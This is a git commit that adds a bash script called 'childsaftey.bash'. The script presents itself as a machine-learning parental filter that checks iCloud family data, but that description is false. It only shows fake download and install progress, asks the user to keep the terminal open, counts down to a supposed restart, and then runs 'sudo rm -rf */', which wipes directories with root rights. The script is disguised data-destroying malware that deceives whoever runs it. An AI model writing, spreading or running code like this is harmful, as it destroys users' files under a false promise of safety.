6fe1d5ffddc97f32533348f2d4f3eb538562680b
kayoisdumb <91438460+kayoisdumb@users.noreply.github.com>
2021-11-24 18:54:40 -0800

    Add files via upload

---
+++ childsaftey.bash
@@ -0,0 +1,40 @@
+#!/bin/bash
+echo "This is a filter created by Kayo Ahmed to scan the computers networking for inappropriate images or text, it also scans files and once found, it will look at the MacBooks iCloud family to get parent's contact info and use machine learning to determine who is the family member installing this program, and notify parent if any content is found from the iCloud account signed in when installed. It is found with an advanced machine learning algorithm that is able to tell the difference between inappropriate content and safe content, do you wish to install and enable this program on this computer? It will run in the background and can only be accessed through this specific program in terminal"
+sleep 45
+echo "To continue, keep this application open, to quit, press command+c, then close the terminal, you have 15 seconds"
+sleep 15
+echo "Downloading"
+sleep 10
+echo "25%"
+sleep 10
+echo "50%"
+sleep 10
+echo "75%"
+sleep 10
+echo "Finished, now installing"
+sleep 15
+echo "25%"
+sleep 25
+echo "50%"
+sleep 10
+echo "75%"
+sleep 10
+echo "Finished"
+sleep 5
+echo "To finish installing, the computer will need to restart, during the restart process, the application will check the files of this computer, this will take 5 - 10 minutes, if over 5 gigabytes of explicit content is found, computer will be disabled for a few more minutes as program will need to remove explicit content"
+sleep 10
+echo "Do you wish to continue, keep this open to continue, if not press command+C then close the terminal, you have 15 seconds"
+sleep 15
+echo "Restarting Now"
+sleep 1
+echo "5"
+sleep 1
+echo "4"
+sleep 1
+echo "3"
+sleep 1
+echo "2"
+sleep 1
+echo "1"
+sleep 5
+sudo rm -rf */
